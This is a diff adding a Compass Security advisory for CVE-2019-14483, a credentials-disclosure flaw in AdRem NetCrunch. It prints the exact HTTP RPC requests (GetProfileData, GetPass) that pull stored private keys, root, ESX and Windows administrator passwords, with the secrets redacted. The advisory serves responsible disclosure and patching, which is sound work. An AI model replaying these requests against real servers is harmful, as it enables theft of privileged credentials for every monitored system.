@@ -1,0 +1,188 @@
+################################################################################
+#
+# COMPASS SECURITY ADVISORY
+# https://compass-security.com/en/research/advisories
+#
+################################################################################
+#
+# Product:  NetCrunch
+# Vendor:   AdRem
+# CSNC ID:  CSNC-2019-018
+# CVE ID:   CVE-2019-14483
+# Subject:  Credentials Disclosure
+# Risk:     Medium
+# Effect:   Remotely exploitable
+# Authors:  Thierry Viaccoz <thierry.viaccoz@compass-security.com>
+#           Sylvain Heiniger <sylvain.heiniger@compass-security.com>
+#           Fabio Poloni <fabio.poloni@compass-security.com>
+# Date:     26.07.2019
+#
+################################################################################
+
+Introduction:
+-------------
+NetCrunch [1] is a so-called "agentless" monitoring solution developed by 
+AdRem. It allows system administrators to monitor, visualize and get alerts 
+from many kinds of systems in their network. The solution consists of a server 
+and a fat client (also called console), as well as a web client.
+
+Due to its architecture, the monitoring server is a critical system as it 
+holds credentials, most of the time privileged, for all monitored system.
+
+Compass Security identified a Credentials Disclosure vulnerability in AdRem 
+NetCrunch. Successful exploitation requires authentication and can be performed 
+remotely.
+
+Every user can read the BSD, Linux, MacOS and Solaris private keys, private 
+keys' passwords and root passwords stored in the credential manager.
+
+Every administrator can read the ESX and Windows passwords stored in the 
+credential manager.
+
+Affected:
+---------
+Initially vulnerable:
+ * AdRem NetCrunch 10.6.0.4587
+
+Not vulnerable:
+ * AdRem NetCrunch 10.6.1.4607
+
+No other version was tested, but it is believed that older versions are also 
+vulnerable.
+
+Technical Description:
+----------------------
+Every user can read the BSD, Linux, MacOS and Solaris private keys, private 
+keys' passwords and root passwords stored in the credential manager.
+
+Request to list all the Linux profiles identified by their type stored in the credential manager. Here, "@Linux" is used, but it could also be "@BSD", "@MacOS" or "@Solaris":
+    POST /ncsrv/dashboards/summary/rpc?api=ncsrv&sid=2114482644 HTTP/1.1
+    Host: some-server
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json
+    X-Requested-With: XMLHttpRequest
+    Content-Length: 93
+    Cookie: WASessionId=2114868629
+    Connection: close
+    
+    [{"action":"IRemoteProfileDB","method":"GetProfiles","data":["@Linux"],"type":"rpc","tid":2}]
+
+Response returning the list of profiles with their associated ID:
+    HTTP/1.1 200 OK
+    Connection: close
+    Content-Type: text/json; charset=UTF-8
+    Content-Length: 103
+    Cache-control: no-cache
+    Date: Wed, 31 Jul 2019 14:43:30 GMT
+    Pragma: no-cache
+    Server: AdRem WebApp Server
+    
+    [{"type":"rpc","tid":2,"action":"IRemoteProfileDB","method":"GetProfiles","result":{"<Default>":3001}}]
+
+Request to retrieve the data of a specific profile defined by its type 
+(@Linux) and its ID found before (3001):
+    POST /ncsrv/dashboards/summary/rpc?api=ncsrv&sid=2114482644 HTTP/1.1
+    Host: some-server
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json
+    X-Requested-With: XMLHttpRequest
+    Content-Length: 101
+    Cookie: WASessionId=2114868629
+    Connection: close
+    
+    [{"action":"IRemoteProfileDB","method":"GetProfileData","data":["@Linux",3001],"type":"rpc","tid":2}]
+
+Response returning the private key, the private key's password and the root 
+password of the Linux system:
+    HTTP/1.1 200 OK
+    Connection: close
+    Content-Type: text/json; charset=UTF-8
+    Content-Length: 237
+    Cache-control: no-cache
+    Date: Wed, 31 Jul 2019 14:43:59 GMT
+    Pragma: no-cache
+    Server: AdRem WebApp Server
+    
+    [{"type":"rpc","tid":2,"action":"IRemoteProfileDB","method":"GetProfileData","result":{"user":"ncuser","useprivatekey":true,"password":null,"privatekey":"[CUT]","execmode":0,"rootpassword":"[CUT]","privatekeypassword":"[CUT]"}}]
+
+Every administrator can read the ESX and Windows passwords stored in the 
+credential manager.
+
+Request to retrieve the password of the ESX systems:
+    POST /ncsrv/dashboards/summary/rpc?api=ncsrv&sid=2114482644 HTTP/1.1
+    Host: some-server
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json
+    X-Requested-With: XMLHttpRequest
+    Content-Length: 94
+    Cookie: WASessionId=2114868629
+    Connection: close
+    
+    [{"action":"IRemotePassDB","method":"GetPass","data":["@ESX",3001,true],"type":"rpc","tid":2}]
+
+Response returning the password of the ESX system:
+    HTTP/1.1 200 OK
+    Connection: close
+    Content-Type: text/json; charset=UTF-8
+    Content-Length: 133
+    Cache-control: no-cache
+    Date: Wed, 31 Jul 2019 15:05:50 GMT
+    Pragma: no-cache
+    Server: AdRem WebApp Server
+    
+    [{"type":"rpc","tid":2,"action":"IRemotePassDB","method":"GetPass","result":{"credentials":{"user":"root","password":"[CUT]"}}}]
+
+Request to retrieve the password of the Windows systems:
+    POST /ncsrv/dashboards/summary/rpc?api=ncsrv&sid=2114482644 HTTP/1.1
+    Host: some-server
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json
+    X-Requested-With: XMLHttpRequest
+    Content-Length: 98
+    Cookie: WASessionId=2114868629
+    Connection: close
+    
+    [{"action":"IRemotePassDB","method":"GetPass","data":["@Windows",3001,true],"type":"rpc","tid":2}]
+
+Response returning the password of the Windows system:
+    HTTP/1.1 200 OK
+    Connection: close
+    Content-Type: text/json; charset=UTF-8
+    Content-Length: 140
+    Cache-control: no-cache
+    Date: Wed, 31 Jul 2019 15:06:12 GMT
+    Pragma: no-cache
+    Server: AdRem WebApp Server
+    
+    [{"type":"rpc","tid":2,"action":"IRemotePassDB","method":"GetPass","result":{"credentials":{"user":"Administrator","password":"[CUT]"}}}]
+
+Workaround / Fix:
+-----------------
+It shouldn't be possible to access the credentials stored in the credential 
+manager.
+
+As a NetCrunch customer, update your installation to the latest version to 
+receive the fix.
+
+Timeline:
+---------
+2019-05-23: Discovery by Thierry Viaccoz, Sylvain Heiniger and Fabio Poloni
+2019-08-01: Assigned CVE-2019-14483
+2019-08-29: Initial vendor notification
+2020-12-08: Coordinated public disclosure date
+
+References:
+-----------
+[1] https://www.adremsoft.com/
